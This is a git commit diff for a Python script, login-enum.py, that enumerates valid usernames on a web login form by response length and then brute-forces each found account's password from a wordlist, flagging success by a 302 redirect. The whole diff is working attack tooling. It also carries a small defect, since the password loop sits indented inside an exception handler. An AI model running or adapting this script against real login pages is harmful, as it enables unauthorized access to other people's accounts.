3d9eb7f42801f938e13ca56fb582c80d19619621
Han <han@sinchan.local>
2025-05-31 09:31:47 +0800

    fix error

--- login-enum.py
+++ login-enum.py
@@ -14,17 +14,17 @@ def check_username(username):
         "password": "password"
     }
 
-try:
-    response = requests.post(URL,headers=HEADERS, data=data)
-    if len(response,text) > 2986:
-        print(f"[v] USERNAME VALID: {username}")
-        return True
-    else:
-        print(f"[x] USERNAME NOT VALID: {username}")
+    try:
+        response = requests.post(URL,headers=HEADERS, data=data)
+        if len(response.text) > 2986:
+            print(f"[v] USERNAME VALID: {username}")
+            return True
+        else:
+            print(f"[x] USERNAME NOT VALID: {username}")
+            return False
+    except Exception as e:
+        print(f"[!] Field checked: {e}")
         return False
-except Exception as e:
-    print(f"[!] Field checked: {e}")
-    return False
 
 def try_check_password(username,password):
     data = {
@@ -34,3 +34,35 @@ def try_check_password(username,password):
 
     try:
         response = requests.post(URL, headers=HEADERS,data=data,allow_redirects=False)
+        if response.status_code == 302 and len(response.text) == 170:
+            print(f"[v] LOGIN SUCCESS: {username} : {password}")
+            return True
+        else:
+            print(f"[x] LOGIN FIELD: {username} : {password}")
+            return False
+    except Exception as e:
+        print(f"[!] Request Field {e}")
+        return False
+
+valid_data = []
+
+try: 
+    with open(USERNAME, 'r') as file:
+        for user in file:
+            user = user.strip()
+            if check_username(user):
+                valid_data.append(user)
+except FileNotFoundError:
+    print(f"[!] File username '{USERNAME}' not found")
+    exit()
+
+    for valid_user in valid_data:
+        try:
+            with open(PASSWORD, 'r') as file:
+                for pw in file:
+                    pw = pw.strip()
+                    if try_check_password(valid_user, pw):
+                        break
+        except FileNotFoundError:
+            print(f"[!] File password '{PASSWORD}' not found")
+            exit()
